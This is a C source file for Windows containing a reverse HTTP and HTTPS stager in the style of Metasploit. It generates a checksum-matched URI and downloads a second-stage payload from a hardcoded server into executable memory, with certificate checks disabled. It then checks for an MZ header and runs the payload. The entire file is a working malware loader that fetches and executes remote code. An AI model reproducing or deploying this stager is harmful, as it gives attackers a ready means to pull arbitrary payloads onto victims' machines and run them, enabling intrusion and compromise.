#define WIN32_LEAN_AND_MEAN



#include <windows.h>
#include <winternl.h>
#include <time.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "Wininet.lib")

/*
https://www.ccn-cert.cni.es/pdf/documentos-publicos/xiii-jornadas-stic-ccn-cert/ponencias/4423-s17-12-01-remote-code-execution-in-restricted-environments/file.html

*/

#define URL_MAX_LENGHT 84

void gen_random(char* string, const int len) {
	char alphanum[63];
	int ich = 0;
	for (char l = 'a'; l <= 'z'; ++l, ich++)
		alphanum[ich] = l;
	for (char l = 'A'; l <= 'Z'; ++l, ich++)
		alphanum[ich] = l;
	for (char l = '0'; l <= '9'; ++l, ich++)
		alphanum[ich] = l;


	for (int i = 0; i < len; ++i)
		string[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	string[len] = 0;
}

int TextChecksum8(char* text) {
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
		temp += (int)text[i];
	return temp % 0x100;
}

void genURL(char* FullURL,int urlLenght) {
	int checksum = 0;			//Calculated Checksum placeholder. 
	char URI[URL_MAX_LENGHT] = { 0 };


	srand((unsigned int)time(0));
	while (checksum != 92) { // const int URI_CHECKSUM_INITW = 92;
		gen_random(URI, urlLenght - 2);
		checksum = TextChecksum8(URI);
	}
	FullURL[0] = '/';
	strcat_s(FullURL, urlLenght, URI);
	FullURL[urlLenght -1] = '\0';
	return;
}


BOOL StagerReverseHTTP(char* ServeurIP, int Port) {
	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;

	const int urlLenght = rand() % 40 +30;
	char FullURL[URL_MAX_LENGHT] = { 0 }; //TO_UPDATE !!
	char* Stage2Buffer;

	const char get[] = "GET";
	const char HttpHeader[] = "Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)";
	genURL(FullURL, urlLenght);

	printf("[+] Full URL: %s\n", FullURL);
	hInternetOpen = InternetOpenA(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternetOpen == NULL) {
		printf("[x] Error InternetOpenA\n");
		return FALSE;
	}
	hInternetConnect = InternetConnectA(hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hInternetConnect == NULL) {
		printf("[x] Error InternetConnectA\n");
		return FALSE;
	}
	hInternetRequest = HttpOpenRequestA(hInternetConnect, get, FullURL, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT, 0);
	if (hInternetRequest == NULL) {
		printf("[x] Error HttpOpenRequestA\n");
		return FALSE;
	}
	if (!HttpSendRequestA(hInternetRequest, NULL, 0, NULL, 0)) {
		printf("[x] Error HttpSendRequestA\n");
		return FALSE;
	}
	Stage2Buffer = (char*)VirtualAlloc(0, (4096 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);// (4096 * 1024)
	if (Stage2Buffer != NULL) {
		BOOL bKeepReading = 1;
		DWORD dwBytesRead = (DWORD)-1; // DWORD dwBytesRead = -1.0;
		DWORD dwBytesWritten = 0;
		while (bKeepReading && dwBytesRead != 0) {
			bKeepReading = InternetReadFile(hInternetRequest, (Stage2Buffer + dwBytesWritten), 4096, &dwBytesRead);
			dwBytesWritten += dwBytesRead;
		}
		InternetCloseHandle(hInternetRequest);
		InternetCloseHandle(hInternetConnect);
		InternetCloseHandle(hInternetOpen);


#if JUNK_COMM
		// remove junk data 
		char* Stage2BufferClear = (char*)funcApi.VirtualAlloc(0, STAGE2_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);// (4096 * 1024)
		if (Stage2BufferClear != NULL) {
			memcpyF(Stage2BufferClear, Stage2Buffer + JUNK_DATA_SIZE, STAGE2_SIZE);

			// Run Stage 2 
			if (Stage2BufferClear != NULL && Stage2BufferClear[0] == 'M' && Stage2BufferClear[1] == 'Z') {
				(*(void(*)())Stage2BufferClear)();
				Kernel32Api.VirtualFreeF(Stage2BufferClear, 0, MEM_RELEASE);
				Kernel32Api.VirtualFreeF(Stage2Buffer, 0, MEM_RELEASE);
				return 1;
			}
			Kernel32Api.VirtualFreeF(Stage2BufferClear, 0, MEM_RELEASE);
		}
#else
		printf("[+] Run Stage 2\n");
		// Run Stage 2 
		if (Stage2Buffer != NULL && Stage2Buffer[0] == 'M' && Stage2Buffer[1] == 'Z') {
			(*(void(*)())Stage2Buffer)();
			VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
			return TRUE;
		}
#endif

		VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
		//Sleep(10000);
	}
	return FALSE;
}
BOOL StagerReverseHTTPS(char* ServeurIP, int Port) {
	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;

	const int urlLenght = rand() % 40 + 30;
	char FullURL[URL_MAX_LENGHT] = { 0 }; //TO_UPDATE !!
	char* Stage2Buffer;

	DWORD flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);


	const char get[] = "GET";
	const char HttpHeader[] = "Mozilla/5.0 (Windows N WOW64; rv:11.0) Gecko Firefox/11.0";
	genURL(FullURL, urlLenght);

	printf("[+] Full URL: %s\n", FullURL);
	
	hInternetOpen = InternetOpenA(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternetOpen == NULL) {
		printf("[x] Error InternetOpenA\n");
		return FALSE;
	}
	hInternetConnect = InternetConnectA(hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hInternetConnect == NULL) {
		printf("[x] Error InternetConnectA\n");
		return FALSE;
	}
	hInternetRequest = HttpOpenRequestA(hInternetConnect, get, FullURL, NULL, NULL, NULL, flags, 0);
	if (hInternetRequest == NULL) {
		printf("[x] Error HttpOpenRequestA\n");
		return FALSE;
	}
	DWORD dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
	if (!InternetSetOptionA(hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD))) {
		printf("[x] Error InternetSetOptionA\n");
		return FALSE;
	}
	if (!HttpSendRequestA(hInternetRequest, NULL, 0, NULL, 0)) {
		printf("[x] Error HttpSendRequestA\n");
		return FALSE;
	}
	Stage2Buffer = (char*)VirtualAlloc(0, (4096 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);// (4096 * 1024)
	if (Stage2Buffer != NULL) {
		BOOL bKeepReading = 1;
		DWORD dwBytesRead = (DWORD)-1; // DWORD dwBytesRead = -1.0;
		DWORD dwBytesWritten = 0;
		while (bKeepReading && dwBytesRead != 0) {
			bKeepReading = InternetReadFile(hInternetRequest, (Stage2Buffer + dwBytesWritten), 4096, &dwBytesRead);
			dwBytesWritten += dwBytesRead;
		}
		InternetCloseHandle(hInternetRequest);
		InternetCloseHandle(hInternetConnect);
		InternetCloseHandle(hInternetOpen);


#if JUNK_COMM
		// remove junk data 
		char* Stage2BufferClear = (char*)funcApi.VirtualAlloc(0, STAGE2_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);// (4096 * 1024)
		if (Stage2BufferClear != NULL) {
			memcpyF(Stage2BufferClear, Stage2Buffer + JUNK_DATA_SIZE, STAGE2_SIZE);

			// Run Stage 2 
			if (Stage2BufferClear != NULL && Stage2BufferClear[0] == 'M' && Stage2BufferClear[1] == 'Z') {
				(*(void(*)())Stage2BufferClear)();
				Kernel32Api.VirtualFreeF(Stage2BufferClear, 0, MEM_RELEASE);
				Kernel32Api.VirtualFreeF(Stage2Buffer, 0, MEM_RELEASE);
				return 1;
			}
			Kernel32Api.VirtualFreeF(Stage2BufferClear, 0, MEM_RELEASE);
		}
#else
		printf("[+] Run Stage 2\n");
		// Run Stage 2 
		if (Stage2Buffer != NULL && Stage2Buffer[0] == 'M' && Stage2Buffer[1] == 'Z') {
			(*(void(*)())Stage2Buffer)();
			VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
			return 1;
		}
#endif
		VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
		//Sleep(10000);
	}
	return 0;
}


int main() {
	//StagerReverseHTTP("192.168.100.80",8080);
	StagerReverseHTTPS("192.168.100.80",8443);
	system("pause");
	return FALSE;
}